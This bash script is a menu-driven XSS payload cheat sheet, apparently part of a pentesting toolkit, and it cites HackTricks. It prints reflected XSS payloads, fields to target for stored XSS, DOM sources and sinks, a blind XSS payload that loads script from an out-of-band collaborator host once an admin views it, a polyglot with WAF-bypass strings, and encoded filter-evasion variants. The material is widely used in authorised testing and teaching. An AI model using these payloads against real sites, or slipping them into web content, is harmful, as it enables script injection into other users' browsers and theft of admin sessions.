#!/bin/bash
# HackTricks Ref: xss-cross-site-scripting.md
# Module: XSS (Cross-Site Scripting) - The Ultimate Checklist

echo -e "${C6}[WEB ATTACK: XSS_MASTER]${NC}"
echo -e "Reference: https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting"
echo -e "--------------------------------------------------"

echo -e "${C4}Select XSS Attack Vector:${NC}"
echo "1) Reflected XSS (Search/URL params)"
echo "2) Stored XSS (Profiles/Comments/Logs)"
echo "3) DOM-based XSS (Sink/Source analysis)"
echo "4) Blind XSS (Out-of-band exfiltration)"
echo "5) WAF Bypass & Polyglot Payloads"
echo "6) Filter Evasion (Encoded/Obfuscated)"
echo "0) Exit"

read -p "Selection: " xss_opt

case $xss_opt in
    1)
        echo -e "\n${C2}[*] Reflected XSS Payloads:${NC}"
        echo " - <script>alert(document.domain)</script>"
        echo " - <img src=x onerror=alert(1)>"
        echo " - <svg onload=alert(1)>"
        echo " - \"><details open ontoggle=alert(1)>"
        ;;
    2)
        echo -e "\n${C2}[*] Stored XSS (Persistent):${NC}"
        echo "Check every field that saves to the DB:"
        echo " - Usernames, Addresses, Bio, Filenames (on upload)"
        echo " - User-Agent headers (if logged by admin)"
        echo " - X-Forwarded-For (if logged)"
        ;;
    3)
        echo -e "\n${C2}[*] DOM XSS Sinks & Sources:${NC}"
        echo "Sources: location.hash, location.search, document.referrer"
        echo "Sinks:   innerHTML, eval(), setTimeout(), document.write()"
        echo -e "${C4}Check: Use 'DOM Invader' in Burp Suite.${NC}"
        ;;
    4)
        echo -e "\n${C2}[*] Blind XSS:${NC}"
        echo "Target: Admin panels or back-end logs."
        echo "Payload: <script src=\"https://your-collaborator-id.oastify.com\"></script>"
        echo "Wait for the admin to view your payload on their dashboard."
        ;;
    5)
        echo -e "\n${C2}[*] Polyglot & Bypass:${NC}"
        echo "Polyglot: jaVasCript:/*-/*\`/*\\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtArEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()\\x3e"
        echo "Bypass 'javascript:': java%0d%0ascript:alert(1)"
        ;;
    6)
        echo -e "\n${C2}[*] Filter Evasion:${NC}"
        echo " - Hex: %3c%73%63%72%69%70%74%3e"
        echo " - String.fromCharCode(60, 115, 99, 114, 105, 112, 116, 62)"
        echo " - No spaces: <svg/onload=alert(1)>"
        ;;
    *) return ;;
esac

echo -e "\n--------------------------------------------------"
read -p "Press Enter to return..."
